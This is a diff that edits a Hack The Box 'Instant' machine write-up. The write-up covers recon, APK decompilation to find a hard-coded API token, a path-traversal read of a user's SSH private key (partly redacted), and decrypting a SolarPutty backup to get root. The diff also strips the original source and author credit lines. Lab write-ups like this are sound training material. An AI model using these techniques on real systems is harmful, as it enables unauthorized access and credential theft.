@@ -1,26 +1,18 @@
 # :game_die: HTB Instant Writeup. Machine: Instant
 
-> **Original Source:** [HTB Instant Writeup. Machine: Instant](https://infosecwriteups.com/htb-instant-writeup-26f919bafaee)
-> **Platform:** infosecwriteups.com | **Category:** `MISC`
-
 ---
 
 Machine: Instant
 
-
 Level: Medium
 
-
 Type: Linux
-
 
 Season: Heist (6)
 
 ## Reconnaissance
 
-
 Start with a port scan to see what services are running and open
-
 
 ```
 ┌──(kali㉿hammer)-[~/htb/instant]
@@ -37,12 +29,9 @@ Nmap done: 1 IP address (1 host up) scanned in 8.52 seconds
 └─$
 ```
 
-
 SSH and HTTP services appear to be running and open based on the ports.
 
-
 Let’s do a quick check on port 80 for interesting links and subdomains
-
 
 ```
 ┌──(kali㉿hammer)-[~/htb/instant]
@@ -61,12 +50,9 @@ Dload Upload Total Spent Left Speed
 └─$
 ```
 
-
 No links to subdomains in the index, but there are multiple references and links to an Android package (.apk).
 
-
 Download Android package to decompile and inspect
-
 
 ```
 ┌──(kali㉿hammer)-[~/htb/instant]
@@ -78,9 +64,7 @@ Dload Upload Total Spent Left Speed
 └─$
 ```
 
-
 Decompile the Android package with ‘jadx’
-
 
 ```
 ┌──(kali㉿hammer)-[~/htb/instant]
@@ -92,9 +76,7 @@ ERROR - finished with errors, count: 13
 └─$
 ```
 
-
 We start by looking for endpoints/hostnames/credentials. Quickly identify API endpoints and calls by running grep for the domain ‘instant.htb’.
-
 
 ```
 ┌──(kali㉿hammer)-[~/htb/instant/output]
@@ -113,59 +95,41 @@ sources/com/instantlabs/instant/TransactionActivity.java: new OkHttpClient().new
 └─$
 ```
 
-
 The ‘AdminActivities.java’ result is interesting and upon closer inspection, that file contains an API endpoint (http://<redacted>.instant.htb/api/v1/view/profile) along with a hard-coded ‘Authorization’ header.
-
 
 Time to test the authorization code and explore the APIs…
 
-
 If we access [http://<redacted>.instant.htb](http://swagger-ui.instant.htb/apidocs/)/ we get redirected to [http://<redacted>.instant.htb/apidocs/](http://swagger-ui.instant.htb/apidocs/)
-
 
 The API’s are not extensive, so it would be possible to audit them manually.
 
-
 I used Burp Suite Professional to load the API definition and run an automatic ‘API Scan and Audit’ scan.
-
 
 ## Get Tom O'Neill’s stories in your inbox
 
-
 Join Medium for free to get updates from this writer.
 
-
 Remember me for faster sign in
-
 
 The scan quickly and easily identifies a vulnerable endpoint that can be used to obtain a foothold on the system.
 
 ## Foothold
 
-
 BurpSuite quickly and easily identifies a Local File Inclusion (LFI aka ‘File Path Traversal’) vulnerability in the ‘read/log’ endpoint.
-
 
 *Vulnerability response*
 
-
 *Vulnerability request*
-
 
 While testing the ‘view/logs’ API, it was noted that the log files being read by the APIs are in the user’s home directory.
 
-
 At this point, we can read the user flag in /home/shirohige/user.txt.
-
 
 Yay! But we still need server access.
 
-
 We know we have a Linux machine with SSH running, and we identified a user account whose home directory we can read files from…
 
-
 Leverage LFI vulnerability to read id_rsa from the shirohige user’s home directory
-
 
 ```
 HTTP/1.1 201 CREATED
@@ -178,9 +142,7 @@ Connection: close
 {"/home/shirohige/logs/../.ssh/id_rsa":["-----BEGIN RSA PRIVATE KEY-----\n","MIIEpAIBAAKCAQEAzCnA9vgcq+ redacted","-----END RSA PRIVATE KEY-----\n"],"Status":201}
 ```
 
-
 Access server as ‘shirohige’ via SSH using the id_rsa private key
-
 
 ```
 ┌──(kali㉿hammer)-[~/htb/instant]
@@ -208,18 +170,13 @@ Last login: Mon Oct 14 15:59:52 2024 from 10.10.14.38
 shirohige@instant:~$
 ```
 
-
 ## Privilege Escalation
-
 
 Enumeration is always the next step…
 
-
 While reviewing the contents of the filesystem, found a /opt/backup with a SolarPutty directory and sessions-backup.dat.
 
-
 Decode the sessions-backup.dat file and view the decoded output to obtain the root credentials ([https://voidsec.com/solarputtydecrypt/](https://voidsec.com/solarputtydecrypt/))
-
 
 ```
 
@@ -261,12 +218,9 @@ Decode the sessions-backup.dat file and view the decoded output to obtain the ro
 }
 ```
 
-
 Login to the user account using the looted SSH key.
 
-
 Switch to the root account using the password from the sessions-backup.dat and read the root flag.
-
 
 ```
 ┌──(kali㉿hammer)-[~/htb/instant]
@@ -285,10 +239,6 @@ root@instant:~# cat root.txt
 root@instant:~#
 ```
 
-
 Happy Saturday. Happy hacking.
 
 ---
-
-*Originally published on [Medium](https://infosecwriteups.com/htb-instant-writeup-26f919bafaee). All credit goes to the original author.*
-*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
